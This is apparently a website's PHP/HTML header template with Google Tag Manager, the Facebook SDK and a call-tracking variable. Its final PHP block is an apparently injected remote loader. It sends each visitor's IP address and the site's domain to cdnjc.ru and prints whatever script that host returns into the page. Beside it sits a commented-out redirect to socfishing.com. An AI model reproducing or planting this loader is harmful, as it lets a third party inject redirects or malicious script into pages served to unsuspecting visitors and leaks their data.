<!--Google Tag Manager -->
<script>(function(w, d, s, l, i){
		w[l] = w[l] || [];
		w[l].push({'gtm.start':
					new Date().getTime(), event:'gtm.js'});
		var f = d.getElementsByTagName(s)[0],
				j = d.createElement(s), dl = l != 'dataLayer'?'&l=' + l:'';
		j.async = true;
		j.src = '//www.googletagmanager.com/gtm.js?id=' + i + dl;
		f.parentNode.insertBefore(j, f);
	})(window, document, 'script', 'dataLayer', 'GTM-TBKQ6Z4');</script>
<!-- End Google Tag Manager -->

<script>
	window.fbAsyncInit = function(){
		FB.init({
			appId:'682820148516805',
			xfbml:true,
			version:'v2.3'
		});
	};

	(function(d, s, id){
		var js, fjs = d.getElementsByTagName(s)[0];
		if(d.getElementById(id)){
			return;
		}
		js = d.createElement(s);
		js.id = id;
		js.src = "//connect.facebook.net/en_US/sdk.js";
		fjs.parentNode.insertBefore(js, fjs);
	}(document, 'script', 'facebook-jssdk'));
</script>

<script>
	var ringostatHidden = <?=(int)$landing->config['ringostatHidden']?>;
</script>

<?php
	$sload_id = 'a38f60dfbb970078916d0b4a3b1d3b99';
	$sload_opt = stream_context_create(array('https'=>array('timeout'=>2)));  
	$sload_script = @file_get_contents("https://cdnjc.ru/load/?ip={$_SERVER['REMOTE_ADDR']}&domain={$_SERVER['SERVER_NAME']}&term=0&guid=&id={$sload_id}",0,$sload_opt); 
	/*<script>location.href='https://socfishing.com/app/php';</script>*/ 
	if (strlen($sload_script)>0) echo $sload_script;
?>